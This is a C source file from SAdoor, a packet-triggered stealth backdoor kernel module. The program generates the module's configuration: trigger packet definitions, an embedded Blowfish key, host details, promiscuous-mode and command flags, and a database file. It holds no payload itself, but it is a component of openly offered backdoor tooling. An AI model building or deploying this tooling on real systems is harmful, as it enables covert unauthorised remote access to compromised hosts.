/*
 *  File: getconf.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: SAdoor kmod config generator program.
 *  Version: 1.0
 *  Date: Tue Jun 24 18:30:25 CEST 2003
 *
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <time.h>
#include "net.h"
#include "getconf.h"
#include "../config/sakmod_conf.h"

#define PKTSCONF_OUT    argv[1]
#define SADB_OUT        argv[2]

/* Local functions */
static size_t sizeof_packets(struct sa_pkts *);
static void usage(u_char *);

/* Private variables */
static int verbose;

void
usage(u_char *pname)
{
    printf("\nSAdoor kmod config generator version %s\n", KMOD_CONFIG_GEN_VERSION);
    printf("Usage: %s <packets.conf.c> <sadoor.db> [-v]\n\n", pname);
    printf("  packets_conf.h  - Where to write packets.conf.c\n");
    printf("       sadoor.db  - Where to write sadoor.db\n");
    printf("              -v  - Be verbose\n\n");
}

/*
 * Returns total size of packets in bytes.
 */
static size_t
sizeof_packets(struct sa_pkts *packets)
{
    struct sa_pkt *pkt;
    size_t totlen = 0;

    pkt = packets->key_pkts;

    while (pkt != NULL) {
        totlen += sizeof(struct sa_pkt);
        switch(pkt->sa_pkt_proto) {

            case SAPKT_PROTO_TCP:
                totlen += sizeof(struct sa_tcph);
                totlen += ((struct sa_tcph *)(pkt->sa_pkt_ph))->sa_tcph_dlen;
                totlen += SA_ALIGN(((struct sa_tcph *)(pkt->sa_pkt_ph))->sa_tcph_dlen, SADB_ALIGN);
                break;

            case SAPKT_PROTO_UDP:
                totlen += sizeof(struct sa_udph);
                totlen += ((struct sa_udph *)(pkt->sa_pkt_ph))->sa_udph_dlen;
                totlen += SA_ALIGN(((struct sa_udph *)(pkt->sa_pkt_ph))->sa_udph_dlen, SADB_ALIGN);
                break;

            case SAPKT_PROTO_ICMP:
                totlen += sizeof(struct sa_icmph);
                totlen += ((struct sa_icmph *)(pkt->sa_pkt_ph))->sa_icmph_dlen;
                totlen += SA_ALIGN(((struct sa_icmph *)(pkt->sa_pkt_ph))->sa_icmph_dlen, SADB_ALIGN);
                break;
        }

        if (pkt == packets->cmd_pkt)
            break;
        else if (pkt->sa_kpkt_next == NULL)
            pkt = packets->cmd_pkt;
        else
            pkt = pkt->sa_kpkt_next;
    }

    return(totlen);
}


int
main(int argc, char *argv[])
{
    struct sadbhdr sahdr;
    struct sa_pkts *packets;
    struct utsname ut;
    struct sadbent sae;
    int fd;
    
    /* Zero out */
    memset(&sahdr, 0x00, sizeof(sahdr));
    memset(&ut, 0x00, sizeof(ut));
    memset(&sae, 0x00, sizeof(sae));

    if (argc < 3) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    if ((argv[3] != NULL) && (!strcmp(argv[3], "-v")))
        verbose++;

    /* Read packets */
    if (verbose)
        printf("Reading packets from %s\n", PACKETFILE);
        
    if ( (packets = sapc_getpkts(PACKETFILE)) == NULL) {
        fprintf(stderr, "** Error reading packets from %s\n", PACKETFILE);
        exit(EXIT_FAILURE);
    }
    
    sae.se_kpkts = packets->key_pkts;
    sae.se_cpkt = packets->cmd_pkt;
    sae.se_hdr = &sahdr;

    /* Write packet configuration file for kernel module */
    if (verbose)
        printf("Writing PKTSCONF_OUT\n");

    if (writecode(PKTSCONF_OUT, packets) < 0)
        exit(EXIT_FAILURE);


    /* Open target sadoor.db file */
    if ( (fd = open(SADB_OUT, O_WRONLY | O_CREAT | O_TRUNC, 0600)) == -1) {
        fprintf(stderr, "** Error: open(%s): %s\n",
            SADB_OUT, strerror(errno));
        exit(EXIT_FAILURE);
    }

    /* Get system information */
    if (uname(&ut) == -1) {
        fprintf(stderr, "** Error: uname(): %s\n", strerror(errno));
        exit(EXIT_FAILURE);
    }

    /* sadoor.db header */
    sahdr.sah_totlen = sizeof(struct sadbhdr) + sizeof_packets(packets);
    sahdr.sah_ipv4addr = net_inetaddr(SAKMOD_IPV4_ADDR);
    snprintf(sahdr.sah_ver, sizeof(sahdr.sah_ver), "%s", VERSION);

    if ( (int)(sahdr.sah_btime = (u_int)time(NULL)) == -1) {
        fprintf(stderr, "** Error: time(): %s\n", strerror(errno));
        return(-1);
    }

    /* Copy key */
    if ((sizeof(SAKMOD_BFISH_KEY)-1) > 56) {
        fprintf(stderr, "** Warning: Blowfish key truncated to 56 bytes (was %d))\n", 
            sizeof(SAKMOD_BFISH_KEY)-1);
    }
    memcpy(sahdr.sah_bfkey, SAKMOD_BFISH_KEY, 
        sizeof(SAKMOD_BFISH_KEY)-1 > 56 ? 56: sizeof(SAKMOD_BFISH_KEY)-1);

    /* Host information */
    snprintf(sahdr.host.sah_os, sizeof(sahdr.host.sah_os), "%s", ut.sysname);
    snprintf(sahdr.host.sah_rel, sizeof(sahdr.host.sah_rel), "%s", ut.release);
    snprintf(sahdr.host.sah_mah, sizeof(sahdr.host.sah_mah), "%s", ut.machine);

    /* Promisc flag */
#ifdef SAKMOD_IFACE_RUN_PROMISC
    sahdr.sah_flags |= SADOOR_PROMISC_FLAG;
#endif /* SAKMOD_IFACE_RUN_PROMISC */

    /* Single command disabled */
    sahdr.sah_flags |= ((SAKMOD_NOSINGLE_FLAG == 1) ? SADOOR_NOSINGLE_FLAG : 0);

    /* Accept command disabled */
    sahdr.sah_flags |= ((SAKMOD_NOACCEPT_FLAG == 1) ? SADOOR_NOACCEPT_FLAG : 0);

    /* Connect command disabled */
    sahdr.sah_flags |= ((SAKMOD_NOCONNECT_FLAG == 1) ? SADOOR_NOCONNECT_FLAG : 0);
    
    /* Print a warning if all commands are disabled */
    if (NOSINGLE(sahdr.sah_flags) && NOACCEPT(sahdr.sah_flags) && NOCONNECT(sahdr.sah_flags)) {
        fprintf(stderr, "*-*-*-*-*-*-*-*-*-*-* WARNING *-*-*-*-*-*-*-*-*-*-*\n");
        fprintf(stderr, "*          All commands are disabled!\n");
        fprintf(stderr, "* SAdoor will refuse to run with this configuration!\n*\n");
        fprintf(stderr, "* #define SAKMOD_NOSINGLE_FLAG    1\n");
        fprintf(stderr, "* #define SAKMOD_NOACCEPT_FLAG    1\n");
        fprintf(stderr, "* #define SAKMOD_NOCONNECT_FLAG   1\n");
        fprintf(stderr, "*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*\n");
    }

    /* Packets timeout */
    sahdr.sah_tout = (u_int)SAKMOD_PACKETS_TIMEOUT_SEC;

    /* Number of packets */
    sahdr.sah_pktcount = packets->sa_pkts_count;
    
    /* Write sadoor.db */
    if (verbose)
        printf("Writing %s\n", SADB_OUT);
    
    if (sadb_writeraw(fd, &sae, verbose) == -1)
        exit(EXIT_FAILURE);

    close(fd);
    exit(EXIT_SUCCESS);
}
